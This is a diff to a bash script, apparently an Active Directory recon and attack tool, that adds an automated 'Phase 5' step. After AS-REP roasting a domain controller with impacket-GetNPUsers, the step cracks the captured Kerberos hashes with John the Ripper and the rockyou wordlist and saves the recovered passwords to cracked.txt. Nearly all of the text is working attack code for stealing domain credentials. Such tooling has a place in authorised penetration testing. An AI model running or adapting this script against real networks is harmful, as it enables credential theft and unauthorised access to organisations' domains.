@@ -229,7 +229,7 @@ asrep_roast() {
             -usersfile "/tmp/adscope_users_${variant}.txt" \
             -no-pass \
             -dc-ip "$dc" \
-            -format hashcat \
+            -format john \
             -outputfile "$hashfile" 2>/dev/null
 
         if [[ -s "$hashfile" ]]; then
@@ -247,9 +247,98 @@ asrep_roast() {
         sort -u "$combined" -o "$combined"
         echo "[+] Total unique AS-REP hashes: $(grep -c '^\$krb5asrep\$' "$combined")" >&2
         echo "[+] Hashes saved to $combined" >&2
-        echo "[*] Crack with: hashcat -m 18200 $combined <wordlist>" >&2
     else
         echo "[-] No AS-REP roastable accounts found." >&2
+    fi
+}
+
+# ------------------------------------------------------------
+# Phase 5: Crack AS-REP hashes with John
+# ------------------------------------------------------------
+crack_asrep() {
+    local hashfile="$1"
+    local wordlist="$2"
+    local outdir
+    outdir=$(dirname "$hashfile")
+    local potfile="$outdir/john.pot"
+    local cracked_out="$outdir/cracked.txt"
+
+    if [[ ! -s "$hashfile" ]]; then
+        echo "[-] No hashes to crack." >&2
+        return 1
+    fi
+
+    if ! command -v john >/dev/null 2>&1; then
+        echo "[!] john not found (install john)." >&2
+        return 1
+    fi
+
+    # --- Wordlist selection ---
+    local chosen_wordlist=""
+    if [[ -n "$wordlist" ]] && [[ -f "$wordlist" ]]; then
+        chosen_wordlist="$wordlist"
+    else
+        # Interactive prompt if we have a TTY
+        if [[ -t 0 ]]; then
+            echo
+            echo "[?] Wordlist for cracking:"
+            echo "    1) /usr/share/wordlists/rockyou.txt (default)"
+            echo "    2) Custom path"
+            local wl_choice
+            read -rp "[?] Select [1-2]: " wl_choice
+            case "$wl_choice" in
+                2)
+                    local custom_wl
+                    read -rp "[?] Enter path to wordlist: " custom_wl
+                    if [[ -f "$custom_wl" ]]; then
+                        chosen_wordlist="$custom_wl"
+                    else
+                        echo "[!] File not found: $custom_wl" >&2
+                        return 1
+                    fi
+                    ;;
+                *)
+                    chosen_wordlist="/usr/share/wordlists/rockyou.txt"
+                    ;;
+            esac
+        else
+            chosen_wordlist="/usr/share/wordlists/rockyou.txt"
+        fi
+    fi
+
+    # Handle rockyou.txt.gz (Kali ships it compressed)
+    if [[ "$chosen_wordlist" == *.gz ]]; then
+        local decompressed="/tmp/adscope_rockyou.txt"
+        echo "[*] Decompressing $chosen_wordlist..." >&2
+        gunzip -c "$chosen_wordlist" > "$decompressed"
+        chosen_wordlist="$decompressed"
+    fi
+
+    if [[ ! -f "$chosen_wordlist" ]]; then
+        echo "[!] Wordlist not found: $chosen_wordlist" >&2
+        return 1
+    fi
+
+    echo "[*] === Cracking AS-REP hashes ===" >&2
+    echo "[*] Hash file : $hashfile" >&2
+    echo "[*] Wordlist  : $chosen_wordlist" >&2
+
+    # Run John
+    john --format=krb5asrep \
+         --wordlist="$chosen_wordlist" \
+         --pot="$potfile" \
+         "$hashfile" 2>&1 | tee "$outdir/john_run.log" >&2
+
+    # Show cracked passwords
+    echo
+    echo "[*] Cracked credentials:" >&2
+    john --show --format=krb5asrep --pot="$potfile" "$hashfile" \
+        | tee "$cracked_out" >&2
+
+    if [[ -s "$cracked_out" ]]; then
+        echo "[+] Cracked output saved to $cracked_out" >&2
+    else
+        echo "[-] No passwords cracked with this wordlist." >&2
     fi
 }
 
@@ -264,24 +353,28 @@ for cmd in fping nmap ip awk comm sort ldapsearch; do
 done
 
 # Optional tools — warn but don't exit
-for opt in nxc impacket-GetNPUsers; do
+for opt in nxc impacket-GetNPUsers john; do
     command -v "$opt" >/dev/null || echo "[!] Optional tool missing: $opt (some checks will be skipped)" >&2
 done
 
 # Arg parsing
 IFACE_ARG=""
 WORDLIST=""
-while getopts "i:w:h" opt; do
+CRACK_WORDLIST=""
+while getopts "i:w:c:h" opt; do
     case "$opt" in
         i) IFACE_ARG="$OPTARG" ;;
         w) WORDLIST="$OPTARG" ;;
+        c) CRACK_WORDLIST="$OPTARG" ;;
         h)
             cat <<EOF
-Usage: $0 [-i <interface>] [-w <wordlist>]
+Usage: $0 [-i <interface>] [-w <wordlist>] [-c <crack_wordlist>]
 
-  -i <iface>     Network interface to use (skips interactive prompt)
-  -w <wordlist>  Username wordlist for AS-REP roasting
-                 (default: /usr/share/seclists/Usernames/top-usernames-shortlist.txt)
+  -i <iface>            Network interface to use (skips interactive prompt)
+  -w <wordlist>         Username wordlist for AS-REP roasting
+                        (default: /usr/share/seclists/Usernames/top-usernames-shortlist.txt)
+  -c <crack_wordlist>   Password wordlist for cracking AS-REP hashes
+                        (default: /usr/share/wordlists/rockyou.txt)
 EOF
             exit 0
             ;;
@@ -289,7 +382,7 @@ EOF
     esac
 done
 
-# Default wordlist if not supplied
+# Default username wordlist if not supplied
 if [[ -z "$WORDLIST" ]]; then
     for candidate in \
         /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
@@ -304,7 +397,7 @@ if [[ -z "$WORDLIST" ]]; then
 fi
 
 if [[ -z "$WORDLIST" ]]; then
-    echo "[!] No wordlist found. Use -w to specify one." >&2
+    echo "[!] No username wordlist found. Use -w to specify one." >&2
     echo "[!] AS-REP roasting will be skipped." >&2
 fi
 
@@ -357,6 +450,12 @@ if find_dcs "scan_targets.txt" "dc_candidates.txt"; then
     if [[ -n "$WORDLIST" ]] && [[ -n "$DOMAIN" ]]; then
         asrep_roast "$FIRST_DC" "$DOMAIN" "$WORDLIST"
         echo
+
+        # Phase 5 — Crack the hashes
+        HASHFILE="recon_${FIRST_DC//./_}/asrep_all.hashes"
+        if [[ -s "$HASHFILE" ]]; then
+            crack_asrep "$HASHFILE" "$CRACK_WORDLIST"
+        fi
     fi
 else
     echo "[!] No DCs identified. Stopping here."
